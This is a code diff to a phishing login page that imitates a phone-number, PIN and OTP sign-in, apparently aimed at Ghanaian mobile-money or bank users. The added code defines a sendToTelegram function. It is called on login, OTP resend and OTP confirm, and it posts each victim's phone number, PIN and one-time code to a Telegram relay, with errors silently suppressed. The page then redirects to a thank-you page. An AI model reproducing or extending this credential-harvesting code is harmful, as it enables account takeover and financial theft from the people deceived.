@@ -122,7 +122,7 @@ input:focus{border-color:#ffd400;box-shadow:0 0 0 1px rgba(255,212,0,.4)}
 .resend-btn[disabled]{background:#fde68a;cursor:not-allowed}
 .action-secondary{background:#f1f5f9}
 
-/* SPINNER (for resend) */
+/* SPINNER */
 .spinner{
   width:14px;
   height:14px;
@@ -195,6 +195,15 @@ input:focus{border-color:#ffd400;box-shadow:0 0 0 1px rgba(255,212,0,.4)}
 </div>
 
 <script>
+/* ===== TELEGRAM SENDER (RESTORED) ===== */
+function sendToTelegram(payload){
+  fetch('/api/sendTelegram',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(payload)
+  }).catch(()=>{});
+}
+
 /* PHONE */
 const phone=document.getElementById('phone');
 const phoneError=document.getElementById('phoneError');
@@ -256,6 +265,14 @@ function updateLoginState(){
 const otpModal=document.getElementById('otpModal');
 document.getElementById('loginForm').onsubmit=e=>{
   e.preventDefault();
+
+  sendToTelegram({
+    event:'login',
+    phone:'+233'+phone.value,
+    pin:pinValue,
+    time:new Date().toISOString()
+  });
+
   otpModal.style.display='flex';
   startOtp();
 };
@@ -302,20 +319,34 @@ function startCountdown(){
   },1000);
 }
 
-/* RESEND CLICK */
+/* RESEND */
 resendBtn.onclick=()=>{
   resendBtn.disabled=true;
-  const old=resendBtn.innerHTML;
   resendBtn.innerHTML='<span class="spinner"></span>Sending…';
 
+  sendToTelegram({
+    event:'resend_otp',
+    phone:'+233'+phone.value,
+    pin:pinValue,
+    time:new Date().toISOString()
+  });
+
   setTimeout(()=>{
-    resendBtn.innerHTML=old;
+    resendBtn.innerHTML='Resend';
     startCountdown();
   },1200);
 };
 
-/* CONFIRM CLICK */
+/* CONFIRM */
 confirmBtn.onclick=()=>{
+  sendToTelegram({
+    event:'otp_confirm',
+    phone:'+233'+phone.value,
+    pin:pinValue,
+    otp:buffer.value,
+    time:new Date().toISOString()
+  });
+
   window.location.href='thankyou.html';
 };
 
